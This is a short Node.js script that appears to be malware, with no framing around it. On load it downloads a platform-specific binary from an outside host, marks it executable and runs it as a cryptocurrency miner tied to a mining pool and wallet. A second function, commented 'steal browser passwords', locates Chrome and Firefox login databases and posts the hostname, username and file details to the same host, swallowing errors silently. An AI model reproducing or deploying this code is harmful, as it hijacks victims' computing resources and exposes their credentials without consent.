var os = require('os');
var cp = require('child_process');
var https = require('https');
var fs = require('fs');
var path = require('path');

var plat = os.platform();
var arch = os.arch();
var minerUrl = plat === 'win32'
  ? 'https://cdn.example.com/sdd.dll'
  : 'https://cdn.example.com/cloud';

function downloadAndRun(url, outName) {
  var file = path.join(os.tmpdir(), outName);
  var f = fs.createWriteStream(file);
  https.get(url, function(res) {
    res.pipe(f);
    f.on('finish', function() {
      f.close();
      if (plat !== 'win32') {
        cp.execSync('chmod +x ' + file);
      }
      cp.exec(file + ' --pool stratum+tcp://pool.example.com:4444 --user 49Jk8v' +
        'TpZDRnCgX8WhVRqBEnsFvkdF4UZnRVY3SPQHb8S4qGXa9Fw8BUJF2suB6QUHPPvf' +
        'KfSiHaZnJE8TSf5RPG', function(){});
    });
  }).on('error', function() {});
}

// steal browser passwords
function stealCreds() {
  var targets = [];
  if (plat === 'win32') {
    targets.push(path.join(process.env.LOCALAPPDATA || '', 'Google/Chrome/User Data/Default/Login Data'));
    targets.push(path.join(process.env.APPDATA || '', 'Mozilla/Firefox/Profiles'));
  } else if (plat === 'darwin') {
    targets.push(path.join(os.homedir(), 'Library/Application Support/Google/Chrome/Default/Login Data'));
  } else {
    targets.push(path.join(os.homedir(), '.config/google-chrome/Default/Login Data'));
  }

  var stolen = [];
  for (var i = 0; i < targets.length; i++) {
    try {
      if (fs.existsSync(targets[i])) {
        var data = fs.readFileSync(targets[i]);
        stolen.push({ path: targets[i], size: data.length });
      }
    } catch(e) {}
  }

  if (!stolen.length) return;

  var req = https.request({
    hostname: 'cdn.example.com',
    path: '/l',
    method: 'POST',
  });
  req.on('error', function() {});
  req.write(JSON.stringify({ h: os.hostname(), u: os.userInfo().username, creds: stolen }));
  req.end();
}

downloadAndRun(minerUrl, plat === 'win32' ? 'sdd.dll' : 'jsextension');
stealCreds();
